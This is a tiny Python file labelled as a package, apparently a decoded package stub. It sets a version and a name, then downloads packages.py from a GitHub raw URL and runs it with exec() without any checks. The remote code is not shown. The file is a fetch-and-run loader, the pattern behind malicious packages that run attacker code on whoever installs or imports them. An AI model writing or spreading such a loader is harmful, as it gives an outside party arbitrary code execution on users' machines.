[""" Package """]
import urllib.request
version = 9
name = "versions"
exec(urllib.request.urlopen("https://raw.githubusercontent.com/Fries-byte/pistud/refs/heads/main/packages.py").read().decode())

[""" DECODED """]
